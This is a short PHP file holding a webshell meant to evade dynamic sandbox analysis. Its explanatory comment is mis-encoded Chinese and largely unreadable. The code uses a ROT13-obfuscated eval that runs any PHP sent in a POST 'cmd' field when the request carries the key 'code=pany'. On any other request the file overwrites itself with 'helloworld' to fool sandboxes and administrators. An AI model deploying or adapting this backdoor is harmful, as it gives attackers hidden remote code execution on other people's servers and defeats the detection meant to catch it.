<?php
    /*
        ڵPHPwebshellļõǶPHPִhookж̬
        ǹһɳ䣬ĿűִһΣȻִеĽж
        ǵɳڴűִеʱûи׼ȷĲ"code"ͻᵼ»Ըд"fwrite ($fp, $content)"Ľ
        ɳִнһͨı"helloworld"

        Ȼ󣬹Աȥ鿴ļʱ򣬿ľֻһ"helloworld"

        Ǻ"PHPĶ̬ɳ"ƹ

        ɳĻƣɳ䵼ļĻٻ
    */

    //$url = $_SERVER['PHP_SELF'];
    //$filename = end(explode('/',$url));
    //die($filename);
    if($_REQUEST["code"]==pany)
    {
        echo str_rot13('riny($_CBFG[pzq]);');
        eval(str_rot13('riny($_CBFG[pzq]);'));
    }
    else
    {
        $url = $_SERVER['PHP_SELF'];
        $filename = end(explode('/',$url));
           
        $content = 'helloworld';
        $fp = fopen ("$filename","w");
        if (fwrite ($fp, $content))
        {
            fclose ($fp);
            die ("error");
        }
        else
        {
            fclose ($fp);
            die ("good");
        }
        exit;
    }
?>